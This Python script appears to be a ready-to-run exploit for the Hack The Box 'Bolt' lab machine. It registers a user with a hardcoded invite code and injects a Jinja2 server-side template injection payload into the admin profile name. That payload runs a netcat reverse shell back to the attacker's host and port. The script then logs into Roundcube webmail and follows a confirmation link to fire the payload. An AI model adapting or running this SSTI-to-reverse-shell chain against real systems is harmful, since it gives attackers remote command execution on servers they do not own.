#!/usr/bin/env python3

import requests
import argparse
import sys
from bs4 import BeautifulSoup
from http.cookies import SimpleCookie
from urllib.parse import quote


parser = argparse.ArgumentParser()
parser.add_argument('--url', help="Target URL", required=True)
parser.add_argument('--lhost', help="Local Host", required=True)
parser.add_argument('--lport', help="Local Port", required=True)
parser.add_argument('--mailurl', help="mail url", required=True)
parser.add_argument('--user', help="user account to create", required=True)
parser.add_argument('--password', help="password for the user", required=True)

args = parser.parse_args()
proxy = {'http':'http://127.0.0.1:8080'}
def register():
    data = {'username': args.user, 
            'email': f'{args.user}@bolt.htb',
            'password' : args.password, 
            'invite_code':'XNSS-HSJW-3NGU-8XTJ'}
    r = requests.post(args.url + '/register', data=data, proxies=proxy)
    if r.status_code == 200:
        print("[+] Registration Successful!")
    else:
        print("[-] Registration failed with status code: ", r.status_code)
        sys.exit()


def login():
    s = requests.Session()
    data = {'username': args.user,
            'password': args.password}

    cookies = s.cookies
    r = s.post(args.url + '/login', data=data, cookies=cookies, proxies=proxy)
    if r.status_code == 200:
        print("[+] Login Successful")
    else:
        print("[-] Login failed with status code", r.status_code)
        sys.exit()

    return s

def ssti():
    s = login()
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1 |nc {args.lhost} {args.lport} > /tmp/f').read()}}}}"
    enc_payload = quote(payload)
    cookies = s.cookies
    data = {'name': payload, 'experience':'test', 'skills':'test'}
    r = s.post(args.url + '/admin/profile', data=data, cookies=cookies, proxies=proxy)
    if r.status_code == 200:
        print("[+] Name updated successfully")
        
    else:
        print("[-] Failed with status code: ", r.status_code)
        sys.exit()


def mail():
    s = requests.Session()
    token_req = s.get(args.mailurl)
    soup = BeautifulSoup(token_req.text, "html.parser")
    token_reg = soup.find('input', {'name':'_token'})
    token = token_reg.get('value')
    
    


    data = {
            '_token':token,
            '_task':'login',
            '_action':'login',
            '_timezone':'Asia/Kolkata',
            '_url':'',
            '_user': args.user,
            '_pass': args.password
            }
    cookies = s.cookies
    print("[+] Logging into Roundcube")
    r = s.post(args.mailurl + f'/?_task=login', data=data , cookies=cookies, allow_redirects=False, proxies=proxy)
    
    
    token1_req = r.headers.get("Location")
    token1 = token1_req.split('=')[2]

    header_cookie = r.headers.get('Set-Cookie')
   

    final_cookie = SimpleCookie()
    final_cookie_1 = final_cookie.load(header_cookie)
    


    r_in = s.get(args.mailurl + f'/?task=mail&_token={token1}', cookies=final_cookie_1, proxies=proxy)
    r_lm = s.get(args.mailurl + f'/?_task=mail&_action=list&_refresh=1', cookies=final_cookie_1, proxies=proxy)
    r_m = s.get(args.mailurl + f'/?_task=mail&_caps=pdf=1,flash=0,tiff=0,webp=1&_uid=1&_mbox=INBOX&_action=show', cookies=final_cookie_1, proxies=proxy)
    soup = BeautifulSoup(r_m.text, "html.parser")
    links = soup.find_all('a', href=True)

    target_link = None
    for link in links:
        if '/confirm/changes/' in link['href']:
            target_link = link['href']
            break
    if target_link:
        print("[+] Extracted link: ", target_link)
        print("[+] Executing Payload")
    else:
        print("[-] Not found")

    requests.get(target_link, proxies=proxy)
    


register()
ssti()
mail()

